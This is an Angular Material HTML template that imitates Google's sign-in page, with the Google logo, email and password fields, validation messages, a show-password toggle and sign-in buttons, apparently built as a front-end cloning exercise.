<div class="box1">
  <div class="out">
    <button mat-button>Help</button>
    <button mat-button>Privacy</button>
    <button mat-button>Terms</button>
  </div>
  <div class="box2">   
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/2048px-Google_%22G%22_logo.svg.png"/>  

    <div class="full">
      <div class="com">
        <h1>Sign in</h1>
        <h3>Use your Google Account</h3>
      </div>
      <form [formGroup]="loginForm">
        <div class="out1">
          <mat-form-field appearance="outline">
            <mat-label>Email Address</mat-label>
            <input matInput placeholder="Email" formControlName="email">   
            <mat-error *ngIf="loginForm.hasError('required','email')">
              email is Required!
          </mat-error>
          <mat-error *ngIf="loginForm.hasError('email','email')">
              email is not valid!
          </mat-error>     
          </mat-form-field>
          <mat-form-field appearance="outline">
            <mat-label>Password</mat-label>
            <input matInput placeholder="Password" formControlName="Password" [type]="hide ? 'password' : 'text'" >  
            <mat-error *ngIf="loginForm.hasError('required','Password')">
              password is Required!
          </mat-error>
          <mat-error *ngIf="loginForm.hasError('pattern','Password')">
              password is not valid!
          </mat-error>      
          </mat-form-field>
          <div class="for">
            <mat-checkbox class="example-margin" color="primary" (change)="hide=!hide">Show Password</mat-checkbox> 
            <button mat-button color="primary" >Forget Password?</button>
          </div>
          <div class="cre">
            <button mat-button color="primary">Create account</button>
            <button mat-raised-button color="primary" id="des" (click) = "LoginSubmit()">Signin</button>
          </div>          
        </div>

      </form>
      
    </div>    
  </div>
</div>
